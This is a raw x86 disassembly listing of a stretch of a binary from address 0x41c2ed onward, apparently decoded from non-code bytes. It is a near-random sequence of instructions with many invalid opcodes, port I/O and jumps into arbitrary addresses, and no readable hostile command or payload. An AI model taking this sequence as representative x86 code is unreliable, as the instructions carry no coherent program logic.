  41c2ed:	xor    al,0xfe
  41c2ef:	pop    esp
  41c2f0:	ins    BYTE PTR es:[edi],dx
  41c2f1:	or     DWORD PTR [edi+0x3a],ecx
  41c2f4:	sbb    esi,DWORD PTR [ebp+0x32569a4e]
  41c2fa:	jb     0x41c359
  41c2fc:	aam    0xc0
  41c2fe:	int    0xe0
  41c300:	inc    edi
  41c301:	mov    WORD PTR [ebp-0x395922c9],cs
  41c307:	xchg   ebx,eax
  41c308:	stc    
  41c309:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c30b:	sbb    BYTE PTR [eax+0x56],bh
  41c30e:	in     eax,dx
  41c30f:	(bad)  
  41c310:	sti    
  41c311:	in     eax,0x71
  41c313:	call   0x5227e7e5
  41c318:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c319:	lods   al,BYTE PTR ds:[esi]
  41c31a:	sbb    cl,bh
  41c31c:	or     BYTE PTR [ebx],al
  41c31e:	dec    edi
  41c31f:	inc    ebp
  41c320:	fwait
  41c321:	(bad)  
  41c322:	clc    
  41c323:	adc    BYTE PTR [ebx+0x5a3caf86],ch
  41c329:	sub    BYTE PTR [esi+ebx*8-0x5c],bl
  41c32d:	xchg   ebp,eax
  41c32e:	adc    eax,0x60cff5b0
  41c333:	xchg   esi,eax
  41c334:	adc    eax,0x4859e3da
  41c339:	ret    0xda8b
  41c33c:	mov    ebx,0xf3bf1459
  41c341:	fiadd  DWORD PTR [esi]
  41c343:	or     esp,DWORD PTR [esi]
  41c345:	mov    edx,DWORD PTR [eax-0x74b27243]
  41c34b:	inc    esp
  41c34c:	cwde   
  41c34d:	mov    bl,0x56
  41c34f:	(bad)  
  41c350:	lock cmp al,0x98
  41c353:	pop    esp
  41c354:	pushf  
  41c355:	push   ebp
  41c356:	mov    ebp,0xc2fcaee0
  41c35b:	pop    es
  41c35c:	mov    dh,BYTE PTR [ecx+0x2e0f9ff4]
  41c362:	or     ebp,DWORD PTR [eax+0x1f]
  41c365:	int3   
  41c366:	xor    eax,0xc981411e
  41c36b:	sub    esp,DWORD PTR [esi-0x62115587]
  41c371:	and    DWORD PTR [ecx+0x2064fbbf],ebx
  41c377:	adc    dl,BYTE PTR [ebx]
  41c379:	repnz retf 
  41c37b:	and    ecx,DWORD PTR [ecx-0x36211178]
  41c381:	xor    al,0xe0
  41c383:	and    BYTE PTR [edx+ebx*2+0x6b0a8408],0x9d
  41c38b:	jne    0x41c3de
  41c38d:	push   edx
  41c38e:	jge    0x41c3fb
  41c390:	aam    0x5c
  41c392:	push   0x35
  41c394:	scas   al,BYTE PTR es:[edi]
  41c395:	rol    DWORD PTR ds:0x903c01d,0xde
  41c39c:	pusha  
  41c39d:	retf   0x9740
  41c3a0:	test   eax,0xc972b092
  41c3a5:	xor    DWORD PTR [ecx-0x393e9fa9],ebx
  41c3ab:	push   ecx
  41c3ac:	jg     0x41c34a
  41c3ae:	je     0x41c333
  41c3b0:	jne    0x41c3d2
  41c3b2:	cmp    dh,BYTE PTR [ebp-0x60]
  41c3b5:	stc    
  41c3b6:	and    dl,dl
  41c3b8:	sbb    DWORD PTR [ebx],0xffffffb8
  41c3bb:	pop    edi
  41c3bc:	daa    
  41c3bd:	jl     0x41c375
  41c3bf:	push   eax
  41c3c0:	repz inc esp
  41c3c2:	push   cs
  41c3c3:	fnstsw WORD PTR [esi-0x59253929]
  41c3c9:	cdq    
  41c3ca:	fiadd  DWORD PTR [eax+eiz*4-0x185fd30d]
  41c3d1:	out    0xf5,eax
  41c3d3:	stos   BYTE PTR es:[edi],al
  41c3d4:	mov    ah,0x6f
  41c3d6:	mov    esp,0xa8a0e524
  41c3db:	mov    ds:0x895aa197,al
  41c3e0:	sti    
  41c3e1:	push   edi
  41c3e2:	dec    ecx
  41c3e3:	jle    0x41c41e
  41c3e5:	ret    0x39ff
  41c3e8:	sahf   
  41c3e9:	arpl   WORD PTR [ecx-0x70],dx
  41c3ec:	sbb    al,BYTE PTR [edi]
  41c3ee:	call   0x98fd:0x806c00b0
  41c3f5:	out    dx,eax
  41c3f6:	shr    BYTE PTR [ebx],1
  41c3f8:	and    al,0x7f
  41c3fa:	add    al,0xb0
  41c3fc:	das    
  41c3fd:	iret   
  41c3fe:	jp     0x41c453
  41c400:	or     ah,BYTE PTR [edx-0x318f7b6]
  41c406:	es sbb al,0x16
  41c409:	pop    ebp
  41c40a:	or     eax,0xb9155728
  41c40f:	and    DWORD PTR [eax+0x733827cb],esp
  41c415:	push   esp
  41c416:	lods   eax,DWORD PTR ds:[esi]
  41c417:	pop    ss
  41c418:	fadd   DWORD PTR [eax+0x28]
  41c41b:	sbb    DWORD PTR [ecx-0x4b],esi
  41c41e:	mov    eax,0xeaf98bda
  41c423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c424:	xchg   BYTE PTR [ecx*2-0x40315729],dl
  41c42b:	jmp    0x41c3f9
  41c42d:	or     bh,bl
  41c42f:	hlt    
  41c430:	retf   
  41c431:	mov    eax,0x11ba70a7
  41c436:	stos   DWORD PTR es:[edi],eax
  41c437:	mov    ds:0xbb05485a,al
  41c43c:	inc    edi
  41c43d:	ins    BYTE PTR es:[edi],dx
  41c43e:	adc    eax,0xae1cd13
  41c443:	ja     0x41c41e
  41c445:	push   es
  41c446:	adc    eax,DWORD PTR [eax-0x58]
  41c449:	js     0x41c4c3
  41c44b:	or     BYTE PTR [esi+0x77],dh
  41c44e:	stos   DWORD PTR es:[edi],eax
  41c44f:	repz mov ebx,0xec84508
  41c455:	stos   BYTE PTR es:[edi],al
  41c456:	loopne 0x41c449
  41c458:	fwait
  41c459:	adc    DWORD PTR [bx],eax
  41c45c:	fprem1 
  41c45e:	das    
  41c45f:	das    
  41c460:	ja     0x41c4a8
  41c462:	push   0xe
  41c464:	in     al,dx
  41c465:	xchg   edx,eax
  41c466:	push   eax
  41c467:	and    dl,BYTE PTR [eax+0x14]
  41c46a:	push   esi
  41c46b:	lea    edi,[edi]
  41c46d:	xchg   al,dl
  41c46f:	sbb    eax,0xb732b1b9
  41c474:	enter  0x2e27,0xa0
  41c478:	mov    al,ds:0x39e57265
  41c47d:	mov    eax,ds:0x95d5839d
  41c482:	popa   
  41c483:	pop    ecx
  41c484:	test   eax,0xb13c19e9
  41c489:	lods   eax,DWORD PTR ds:[esi]
  41c48a:	int3   
  41c48b:	mov    DWORD PTR [edx],esp
  41c48d:	out    dx,eax
  41c48e:	fsubrp st(7),st
  41c490:	ss mov ebx,0xb4173fe1
  41c496:	lea    ebx,[ebp-0x27]
  41c499:	rol    BYTE PTR [eax],cl
	...
  41c513:	add    BYTE PTR [esi-0x9b72fa0],al
  41c519:	clc    
  41c51a:	sahf   
  41c51b:	out    dx,al
  41c51c:	or     eax,0x3b0d536
  41c521:	jb     0x41c4f7
  41c523:	mov    cl,dl
  41c525:	bound  eax,QWORD PTR [ecx]
  41c527:	add    BYTE PTR [esi+0x7],ch
  41c52a:	add    BYTE PTR [eax],al
  41c52c:	inc    ebp
  41c52d:	lea    esi,[edx+0x3937eff1]
  41c533:	jns    0x41c4dd
  41c535:	or     eax,0xfd276372
  41c53a:	jnp    0x41c4bc
  41c53c:	add    esp,edx
  41c53e:	mov    al,ds:0x42c60e7e
  41c543:	daa    
  41c544:	(bad)  
  41c545:	push   cs
  41c546:	out    0x26,eax
  41c548:	push   esi
  41c549:	mov    es:0x6f16418,al
  41c54f:	rcr    DWORD PTR [esi],0x53
  41c552:	sbb    al,BYTE PTR [edx+0xe48fbd4]
  41c558:	lods   al,BYTE PTR ds:[esi]
  41c559:	jnp    0x41c5b1
  41c55b:	iret   
  41c55c:	xor    eax,ecx
  41c55e:	and    edi,edi
  41c560:	push   ebx
  41c561:	popf   
  41c562:	fist   WORD PTR [ecx]
  41c564:	cmp    esi,esi
  41c566:	loop   0x41c53f
  41c568:	xchg   edx,eax
  41c569:	shr    ch,cl
  41c56b:	xchg   ebp,eax
  41c56c:	jecxz  0x41c550
  41c56e:	dec    ebp
  41c56f:	aad    0x70
  41c571:	cli    
  41c572:	xor    DWORD PTR [edi+0x67d1e5d0],edx
  41c578:	popa   
  41c579:	mov    cl,0xcb
  41c57b:	mov    dh,0xc5
  41c57d:	fs repz push ecx
  41c580:	xchg   esi,eax
  41c581:	sbb    edi,esp
  41c583:	out    dx,eax
  41c584:	mov    DWORD PTR [ecx+0x59],0x98e8766f
  41c58b:	xor    ebx,ecx
  41c58d:	inc    esi
  41c58e:	adc    al,0xac
  41c590:	pop    esi
  41c591:	mov    esp,ds
  41c593:	add    esp,edi
  41c595:	xlat   BYTE PTR ds:[ebx]
  41c596:	shl    DWORD PTR [edi+edx*4+0x77612dcd],0x98
  41c59e:	xor    al,0x0
  41c5a0:	pop    ecx
  41c5a1:	push   ds
  41c5a2:	xchg   esi,eax
  41c5a3:	aad    0xec
  41c5a5:	pop    es
  41c5a6:	outs   dx,BYTE PTR ds:[esi]
  41c5a7:	popa   
  41c5a8:	xor    al,0xa1
  41c5aa:	and    edx,eax
  41c5ac:	sbb    esi,esp
  41c5ae:	repnz sub DWORD PTR [eax],0x5f2bbd3c
  41c5b5:	jp     0x41c5ba
  41c5b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5b8:	inc    edi
  41c5b9:	sbb    eax,ebx
  41c5bb:	inc    edi
  41c5bc:	xor    al,0xd9
  41c5be:	or     bh,ch
  41c5c0:	sub    ecx,DWORD PTR [esi-0x634a15a5]
  41c5c6:	cmp    eax,0xc8e1e15e
  41c5cb:	aad    0xb8
  41c5cd:	mov    edx,eax
  41c5cf:	push   ecx
  41c5d0:	mov    edi,DWORD PTR [esi]
  41c5d2:	call   0x384f:0x3b84c3af
  41c5d9:	xor    BYTE PTR [ebx],ah
  41c5db:	cs sahf 
  41c5dd:	stc    
  41c5de:	push   ecx
  41c5df:	pusha  
  41c5e0:	gs mov esp,0x2c5c6ab1
  41c5e6:	or     al,0x79
  41c5e8:	sub    eax,0xf3b62b99
  41c5ed:	pop    esi
  41c5ee:	xor    ebx,eax
  41c5f0:	dec    ebx
  41c5f1:	retf   0x800
  41c5f4:	retf   
  41c5f5:	or     al,0xdf
  41c5f7:	out    dx,al
  41c5f8:	sub    eax,0xaf23891a
  41c5fd:	dec    eax
  41c5fe:	popf   
  41c5ff:	cli    
  41c600:	data16 neg BYTE PTR [eax+0x3823bc08]
  41c607:	ins    BYTE PTR es:[edi],dx
  41c608:	mov    dl,0xeb
  41c60a:	push   edx
  41c60b:	dec    esp
  41c60c:	ins    DWORD PTR es:[edi],dx
  41c60d:	sub    eax,0xd581181
  41c612:	push   ecx
  41c613:	mov    bl,0xa8
  41c615:	mov    gs,WORD PTR ds:0xd2cc53c5
  41c61b:	lahf   
  41c61c:	push   es
  41c61d:	inc    edi
  41c61e:	mov    bl,0x75
  41c620:	mov    al,0xac
  41c622:	push   0xfffffff3
  41c624:	adc    esp,ebx
  41c626:	aad    0x8a
  41c628:	es test edi,edx
  41c62b:	jae    0x41c648
  41c62d:	jo     0x41c6a4
  41c62f:	sti    
  41c630:	add    BYTE PTR [ebx+0x75],bh
  41c633:	adc    al,0x6c
  41c635:	and    esi,DWORD PTR [eax]
  41c637:	add    al,0x84
  41c639:	sbb    al,0x95
  41c63b:	sbb    DWORD PTR [esi+0x122120bd],edx
  41c641:	mov    ds:0xba3dcbd7,al
  41c646:	cwde   
  41c647:	iret   
  41c648:	or     DWORD PTR [esi-0x1e20b524],eax
  41c64e:	mov    BYTE PTR [eax],0x29
  41c651:	mov    eax,ds:0x5f8d126d
  41c656:	inc    ecx
  41c657:	jge    0x41c6b9
  41c659:	loope  0x41c5ef
  41c65b:	mov    ah,ch
  41c65d:	es pop ebp
  41c65f:	fabs   
  41c661:	sub    dl,bh
  41c663:	in     eax,dx
  41c664:	sbb    eax,0x9e653575
  41c669:	push   ds
  41c66a:	cmp    ch,ch
  41c66c:	jne    0x41c657
  41c66e:	push   edx
  41c66f:	push   edx
  41c670:	cmc    
  41c671:	cld    
  41c672:	push   ss
  41c673:	dec    esp
  41c674:	les    esp,FWORD PTR ds:0x6f466a49
  41c67a:	mov    eax,ds:0xf2851b18
  41c67f:	imul   esi,DWORD PTR [ecx+0x65],0xffffff86
  41c683:	jge    0x41c606
  41c685:	mov    ds:0x629c569d,al
  41c68a:	push   ecx
  41c68b:	mov    dl,0x54
  41c68d:	in     al,0x7f
  41c68f:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41c691:	sub    DWORD PTR [eax],edx
  41c693:	lods   al,BYTE PTR ds:[esi]
  41c694:	mov    al,BYTE PTR [esi+edi*4+0x50]
  41c698:	jmp    0xabf4fbf8
  41c69d:	out    dx,eax
  41c69e:	int    0x8b
  41c6a0:	inc    edx
  41c6a1:	push   ds
  41c6a2:	mov    ?,WORD PTR [ecx-0x33]
  41c6a5:	mov    ecx,0x9dac7e90
  41c6aa:	popa   
  41c6ab:	out    dx,eax
  41c6ac:	data16 adc BYTE PTR [esi],0x52
  41c6b0:	mov    ?,WORD PTR [edx+0x52]
  41c6b3:	fcomp  QWORD PTR [esi+0x10071184]
  41c6b9:	ins    BYTE PTR es:[edi],dx
  41c6ba:	aas    
  41c6bb:	loop   0x41c6c4
  41c6bd:	mov    ds:0xf60209e6,al
  41c6c2:	test   esi,esi
  41c6c4:	pop    ds
  41c6c5:	rcr    DWORD PTR [edi],1
  41c6c7:	sub    ecx,DWORD PTR [ebp+0x7e4b918]
  41c6cd:	es push ebx
  41c6cf:	scas   eax,DWORD PTR es:[edi]
  41c6d0:	lods   al,BYTE PTR ds:[esi]
  41c6d1:	fldenv [edi]
  41c6d3:	shl    DWORD PTR [ebp-0x13],cl
  41c6d6:	mov    ah,0x26
  41c6d8:	mov    edx,0xb3ab5b2b
  41c6dd:	mov    cl,0x9a
  41c6df:	mov    ds:0xa5c39e3c,al
  41c6e4:	mov    esi,0x7d861d30
  41c6e9:	scas   eax,DWORD PTR es:[edi]
  41c6ea:	sub    eax,0xe8232fb0
  41c6ef:	sbb    BYTE PTR [edi],bh
  41c6f1:	ja     0x41c735
  41c6f3:	lahf   
  41c6f4:	push   0xd6c20fe5
  41c6f9:	cmp    BYTE PTR [ebx],bh
  41c6fb:	bound  esi,QWORD PTR [ebp-0x5e50a889]
  41c701:	mov    edx,0xf084a2cb
  41c706:	ret    0xdd39
  41c709:	mov    ebx,0xce61e4bc
  41c70e:	dec    esp
  41c70f:	sbb    DWORD PTR [esi+ebx*4],esi
  41c712:	and    eax,0x18541fd4
  41c717:	mov    ch,0xf4
  41c719:	lds    ebx,FWORD PTR [eax-0x40895a78]
  41c71f:	lds    edi,FWORD PTR [ebp-0x4b3d6db1]
  41c725:	cmc    
  41c726:	jbe    0x41c6e0
  41c728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c729:	or     al,0x7e
  41c72b:	test   al,0x27
  41c72d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c72e:	xchg   ebx,eax
  41c72f:	jp     0x41c736
  41c731:	xor    ah,dl
  41c733:	in     al,0x10
  41c735:	mov    DWORD PTR [edx+edx*4+0x5e],esp
  41c739:	inc    ecx
  41c73a:	or     DWORD PTR ss:[edi],edx
  41c73d:	(bad)  
  41c73e:	aad    0x89
  41c740:	mov    WORD PTR [ecx],fs
  41c742:	inc    ebx
  41c743:	out    0x2d,eax
  41c745:	push   ebx
  41c746:	fdivr  DWORD PTR [eax-0x6e]
  41c749:	not    DWORD PTR [edx-0x49321dba]
  41c74f:	in     al,dx
  41c750:	inc    esi
  41c751:	imul   esi,eax,0x94f31b1b
  41c757:	clc    
  41c758:	push   0x37
  41c75a:	inc    ebp
  41c75b:	fld    DWORD PTR [esi+0x23]
  41c75e:	jae    0x41c77a
  41c760:	sub    BYTE PTR [ebx-0x1e376644],0xcd
  41c767:	jle    0x41c6f0
  41c769:	imul   esp,DWORD PTR [esi],0xffffff9e
  41c76c:	push   0xf2587ad4
  41c771:	cmp    eax,0x8d77b813
  41c776:	and    ebx,DWORD PTR [edi]
  41c778:	out    dx,eax
  41c779:	enter  0xa8b1,0x33
  41c77d:	shl    edi,1
  41c77f:	lods   eax,DWORD PTR ds:[esi]
  41c780:	push   edi
  41c781:	fs mov dh,0x95
  41c784:	dec    esi
  41c785:	cmp    BYTE PTR [ebx+0x6d507ddb],0x8d
  41c78c:	inc    esp
  41c78d:	neg    BYTE PTR [edi-0x6b11f6ce]
  41c793:	rol    DWORD PTR [ebp+eax*2+0x5a7b720c],1
  41c79a:	test   DWORD PTR [edi],esp
  41c79c:	test   DWORD PTR [ecx],esi
  41c79e:	fadd   QWORD PTR [ecx]
  41c7a0:	stos   DWORD PTR es:[edi],eax
  41c7a1:	jae    0x41c809
  41c7a3:	adc    esi,edi
  41c7a5:	mov    esi,0xf2951505
  41c7aa:	sahf   
  41c7ab:	(bad)  
  41c7ac:	jge    0x41c816
  41c7ae:	mov    bh,0x40
  41c7b0:	repnz sub edi,ebp
  41c7b3:	push   ss
  41c7b4:	xchg   DWORD PTR [ebx],ebx
  41c7b6:	xchg   esp,eax
  41c7b7:	bound  esp,QWORD PTR [eax+0x23875886]
  41c7bd:	mov    bh,0x24
  41c7bf:	jecxz  0x41c79b
  41c7c1:	push   esi
  41c7c2:	(bad)  
  41c7c4:	mov    ecx,0xff7b436e
  41c7c9:	xor    BYTE PTR [eax-0x3150f60b],ch
  41c7cf:	mov    ah,0x8c
  41c7d1:	jae    0x41c7dd
  41c7d3:	inc    ebx
  41c7d4:	out    dx,eax
  41c7d5:	addr16 sbb eax,0x8ba78e3f
  41c7db:	xchg   ebx,eax
  41c7dc:	adc    edi,esp
  41c7de:	inc    ebp
  41c7df:	lock (bad) 
  41c7e1:	cld    
  41c7e2:	mov    dl,0x44
  41c7e4:	cwde   
  41c7e5:	adc    eax,0x8dde58f2
  41c7ea:	lods   al,BYTE PTR ds:[esi]
  41c7eb:	jg     0x41c7e1
  41c7ed:	or     dl,BYTE PTR [ebp+0x56]
  41c7f0:	(bad)  
  41c7f1:	outs   dx,BYTE PTR ds:[esi]
  41c7f2:	push   0xffffffb5
  41c7f4:	and    DWORD PTR [eax-0x187c56d9],ebp
  41c7fa:	jne    0x41c780
  41c7fc:	rol    DWORD PTR [esi+0x3],0x58
  41c800:	pusha  
  41c801:	xor    al,0x2f
  41c803:	iret   
  41c804:	js     0x41c7ae
  41c806:	fidivr DWORD PTR [ecx-0x1e218e63]
  41c80c:	add    ebx,DWORD PTR [esi]
  41c80e:	mov    ebp,0x9df16fcf
  41c813:	rol    al,1
  41c815:	retf   
  41c816:	mov    dl,0x91
  41c818:	lods   eax,DWORD PTR ds:[esi]
  41c819:	sub    eax,0x29484aa8
  41c81e:	lods   al,BYTE PTR ds:[esi]
  41c81f:	xor    al,0xcb
  41c821:	xchg   ecx,eax
  41c822:	or     DWORD PTR [edx],ebx
  41c824:	std    
  41c825:	push   cs
  41c826:	cmp    BYTE PTR [ebp-0x2b],al
  41c829:	sub    bh,ah
  41c82b:	mov    ds,edi
  41c82d:	aas    
  41c82e:	mov    cl,0x3e
  41c830:	xor    DWORD PTR [eax+0x1348abbd],eax
  41c836:	pop    ebx
  41c837:	in     al,0x40
  41c839:	cmp    bh,cl
  41c83b:	ret    0x50d3
  41c83e:	aas    
  41c83f:	sbb    eax,0x11e8b61b
  41c844:	cmp    dh,BYTE PTR [eax-0x6646211a]
  41c84a:	in     al,dx
  41c84b:	cmp    ecx,edi
  41c84d:	jge    0x41c81d
  41c84f:	sbb    DWORD PTR [eax],ebx
  41c851:	jp     0x41c8b6
  41c853:	(bad)  
  41c854:	aas    
  41c855:	add    BYTE PTR [ebx+0x6cbb2a81],cl
  41c85b:	adc    cl,BYTE PTR [ebx-0x478908aa]
  41c861:	and    ch,BYTE PTR [esi]
  41c863:	inc    esi
  41c864:	(bad)  
  41c865:	push   eax
  41c866:	(bad)  
  41c868:	push   ebp
  41c869:	jb     0x41c83b
  41c86b:	adc    BYTE PTR [ebx],dl
  41c86d:	jmp    0xf751:0x2a1aa11d
  41c874:	fidivr DWORD PTR [ecx]
  41c876:	cmp    eax,0x9aeda8b2
  41c87b:	dec    edx
  41c87c:	cld    
  41c87d:	or     DWORD PTR [esi],ebp
  41c87f:	push   edx
  41c880:	xchg   edi,eax
  41c881:	add    esi,esp
  41c883:	push   ebp
  41c884:	sub    ecx,DWORD PTR [eax]
  41c886:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c887:	jne    0x41c812
  41c889:	data16 daa 
  41c88b:	sti    
  41c88c:	pop    esi
  41c88d:	in     al,dx
  41c88e:	bndldx (bad),[esi-0x29b7f2fe]
  41c895:	stos   BYTE PTR es:[edi],al
  41c896:	xchg   esi,eax
  41c897:	pop    ds
  41c898:	dec    edi
  41c899:	retf   0x2e94
  41c89c:	xchg   esi,eax
  41c89d:	push   0xffffff91
  41c89f:	inc    edi
  41c8a0:	pop    bx
  41c8a2:	mov    dh,0x7f
  41c8a4:	pushf  
  41c8a5:	add    al,0xd3
  41c8a7:	push   ebx
  41c8a8:	cmp    bh,BYTE PTR [edx+0x1f69bd1]
  41c8ae:	cmp    eax,0x3bd60bcd
  41c8b3:	xchg   BYTE PTR [eax+0x1f8c1c73],dh
  41c8b9:	xchg   ecx,eax
  41c8ba:	xchg   esp,eax
  41c8bb:	and    edx,0x21
  41c8be:	xor    bl,BYTE PTR ds:[eax+0xf952806]
  41c8c5:	clc    
  41c8c6:	pop    esp
  41c8c7:	rcr    BYTE PTR [edx-0x67],cl
  41c8ca:	mov    ch,0x8a
  41c8cc:	mov    bl,0x8d
  41c8ce:	mov    al,BYTE PTR [edx-0x72]
  41c8d1:	xchg   ebp,eax
  41c8d2:	cli    
  41c8d3:	pop    esi
  41c8d4:	mov    al,ds:0xf57175c5
  41c8d9:	ja     0x41c8df
  41c8db:	mov    eax,DWORD PTR [edi+0x28]
  41c8de:	mov    ebx,0x562b3a38
  41c8e3:	popf   
  41c8e4:	ficomp DWORD PTR [edi]
  41c8e6:	(bad)  
  41c8e8:	add    ebx,esp
  41c8ea:	mov    ds:0x3a6e41d0,eax
  41c8ef:	std    
  41c8f0:	leave  
  41c8f1:	sbb    DWORD PTR [ecx+ebp*8],0x2b
  41c8f5:	add    DWORD PTR [ebx+0x13],ebx
  41c8f8:	lods   eax,DWORD PTR ds:[esi]
  41c8f9:	outs   dx,BYTE PTR ds:[esi]
  41c8fa:	dec    eax
  41c8fb:	xchg   edi,eax
  41c8fc:	add    DWORD PTR [esi-0x369a959d],0xe1a3dabf
  41c906:	mov    ah,0xc7
  41c908:	jno    0x41c976
  41c90a:	leave  
  41c90b:	adc    DWORD PTR [ebx+0x7275ca57],ebp
  41c911:	out    dx,eax
  41c912:	add    BYTE PTR [bp-0x3],al
  41c916:	(bad)  
  41c918:	xor    eax,0x4ccaef46
  41c91d:	int    0x8
  41c91f:	fistp  WORD PTR [esi+0x44b2b76f]
  41c925:	sub    BYTE PTR [eax+0x21cde018],ah
  41c92b:	pop    esi
  41c92c:	sub    DWORD PTR [eax],eax
  41c92e:	stc    
  41c92f:	ret    0x1e73
  41c932:	cwde   
  41c933:	or     DWORD PTR [ecx+0x7fc3b512],ebp
  41c939:	clc    
  41c93a:	sbb    ecx,DWORD PTR [ebx]
  41c93c:	in     eax,dx
  41c93d:	popa   
  41c93e:	(bad)  [edx]
  41c940:	popa   
  41c941:	es jae 0x41c953
  41c944:	inc    ecx
  41c945:	pop    edx
  41c946:	cli    
  41c947:	test   eax,0x7cd4d15d
  41c94c:	mov    bh,0x5a
  41c94e:	mov    edi,eax
  41c950:	in     eax,dx
  41c951:	test   DWORD PTR [ecx],ebx
  41c953:	mov    BYTE PTR [edi],dh
  41c955:	mov    edi,0xc8707190
  41c95a:	rcr    DWORD PTR [edi+0x2f],cl
  41c95d:	push   edx
  41c95e:	mov    bh,0xfa
  41c960:	imul   ecx,ecx,0x9049673
  41c966:	mov    dl,0x93
  41c968:	xchg   edx,eax
  41c969:	ins    DWORD PTR es:[edi],dx
  41c96a:	shr    DWORD PTR [eax+0x2],cl
  41c96d:	pop    ss
  41c96e:	dec    ecx
  41c96f:	pop    ecx
  41c970:	and    ebp,DWORD PTR [ebp+0x5e]
  41c973:	daa    
  41c974:	jmp    0x41c9d0
  41c976:	xor    eax,0xbe83c0e2
  41c97b:	inc    eax
  41c97c:	arpl   WORD PTR ds:0x85d1d5c1,sp
  41c982:	ds jae 0x41c933
  41c985:	sahf   
  41c986:	and    ecx,ecx
  41c988:	daa    
  41c989:	mov    eax,0xd7b6c595
  41c98e:	mov    eax,0x2add29df
  41c993:	ret    0xe17f
  41c996:	xor    bh,bh
  41c998:	cs popf 
  41c99a:	fcmovbe st,st(4)
  41c99c:	aam    0x88
  41c99e:	ins    BYTE PTR es:[edi],dx
  41c99f:	into   
  41c9a0:	in     al,dx
  41c9a1:	or     eax,DWORD PTR [edi-0x5d]
  41c9a4:	and    al,0x58
  41c9a6:	mov    ebx,0x5f630832
  41c9ab:	adc    edi,DWORD PTR [ebp-0x652fc122]
  41c9b1:	jmp    0x22dcc586
  41c9b6:	cmp    al,0x86
  41c9b8:	xchg   edx,eax
  41c9b9:	mov    esp,ds
  41c9bb:	cmp    dl,dl
  41c9bd:	cmp    eax,0xd8e03da7
  41c9c2:	mov    edx,0x38b7fee2
  41c9c7:	lock arpl WORD PTR [ebx-0x31],bp
  41c9cb:	mov    ds:0xec99a1b,eax
  41c9d0:	ror    BYTE PTR [eax+eiz*4+0x5c],1
  41c9d4:	cmp    DWORD PTR [esi+0x9],edi
  41c9d7:	aam    0x8f
  41c9d9:	jg     0x41c9be
  41c9db:	dec    eax
  41c9dc:	out    dx,al
  41c9dd:	mov    eax,gs:0xa9adbccb
  41c9e3:	pop    ebx
  41c9e4:	jge    0x41ca31
  41c9e6:	ret    
  41c9e7:	mov    esp,0x782b72ee
  41c9ec:	lds    edi,FWORD PTR [edx-0x53]
  41c9ef:	sbb    cl,ch
  41c9f1:	sub    ch,BYTE PTR [esi-0x21]
  41c9f4:	push   0x39
  41c9f6:	mov    es,ebx
  41c9f8:	sahf   
  41c9f9:	cdq    
  41c9fa:	mov    edx,0x2621a41b
  41c9ff:	(bad)  
  41ca00:	dec    esp
  41ca01:	and    DWORD PTR [edi-0x6d04d1cd],0xffffffff
  41ca08:	xor    BYTE PTR [edx+0x6e],al
  41ca0b:	loop   0x41ca5a
  41ca0d:	xchg   edi,eax
  41ca0e:	ret    
  41ca0f:	mov    bh,0x4e
  41ca11:	ins    BYTE PTR es:[edi],dx
  41ca12:	cmp    DWORD PTR [esi],0xfb802b06
  41ca18:	lea    esp,[edx+0x5ace433]
  41ca1e:	pop    eax
  41ca1f:	pusha  
  41ca20:	adc    ch,BYTE PTR [ebp-0x18]
  41ca23:	lods   al,BYTE PTR ds:[esi]
  41ca24:	push   eax
  41ca25:	and    esp,esp
  41ca27:	jge    0x41ca83
  41ca29:	xor    BYTE PTR [edx],ch
  41ca2b:	sub    DWORD PTR [esp+ebp*1+0x3241accf],ebx
  41ca32:	jbe    0x41ca6f
  41ca34:	hlt    
  41ca35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca36:	adc    ebp,ecx
  41ca38:	pop    ecx
  41ca39:	les    edi,FWORD PTR [edi]
  41ca3b:	or     esp,esi
  41ca3d:	add    al,0x77
  41ca3f:	and    BYTE PTR [edi],cl
  41ca41:	into   
  41ca42:	xor    esp,DWORD PTR [esi]
  41ca44:	rcl    BYTE PTR [esi+edx*1-0x4e3f7c21],0x33
  41ca4c:	cmp    dl,al
  41ca4e:	in     eax,0x6c
  41ca50:	fstp   TBYTE PTR fs:[edi+ebx*8-0xbaa1b3b]
  41ca58:	ins    BYTE PTR es:[edi],dx
  41ca59:	xchg   esp,eax
  41ca5a:	pop    ecx
  41ca5b:	lea    esp,[ebp+0x77ee0688]
  41ca61:	sub    cl,dl
  41ca63:	mov    ss,WORD PTR [ebx]
  41ca65:	pop    ebx
  41ca66:	(bad)  
  41ca67:	inc    ecx
  41ca68:	xor    BYTE PTR [edi+0x2755483d],0x9e
  41ca6f:	js     0x41cab1
  41ca71:	sub    al,0x21
  41ca73:	and    esi,DWORD PTR [ecx]
  41ca75:	stos   BYTE PTR es:[edi],al
  41ca76:	lods   eax,DWORD PTR ds:[esi]
  41ca77:	xor    BYTE PTR [ecx-0xc4d34da],0xc5
  41ca7e:	fadd   QWORD PTR ds:0xe4b31d4f
  41ca84:	mov    ch,0x58
  41ca86:	sub    BYTE PTR [esi+0x76],0x80
  41ca8a:	sar    BYTE PTR [ebx],cl
  41ca8c:	pop    eax
  41ca8d:	cdq    
  41ca8e:	fdiv   QWORD PTR [edx]
  41ca90:	imul   esi,ebx,0xffffffc2
  41ca93:	mov    ah,0xdb
  41ca95:	fadd   DWORD PTR [edi+esi*4]
  41ca98:	fcom   QWORD PTR [ecx-0x71]
  41ca9b:	loopne 0x41ca22
  41ca9d:	mov    cl,BYTE PTR [ebx-0x23a81bd5]
  41caa3:	push   esi
  41caa4:	addr16 mov edx,edi
  41caa7:	ins    DWORD PTR es:[edi],dx
  41caa8:	mov    cs,WORD PTR gs:[ecx]
  41caab:	jg     0x41ca3c
  41caad:	leave  
  41caae:	test   DWORD PTR [ebp-0x35],edi
  41cab1:	push   ebx
  41cab2:	retf   
  41cab3:	cmc    
  41cab4:	xor    esi,DWORD PTR [esi]
  41cab6:	add    esp,edi
  41cab8:	adc    DWORD PTR [esi-0x5611d44a],esi
  41cabe:	call   0xc1b8:0xe6ac294b
  41cac5:	jge    0x41cb28
  41cac7:	daa    
  41cac8:	lds    ecx,FWORD PTR [eax+ebp*8+0x31]
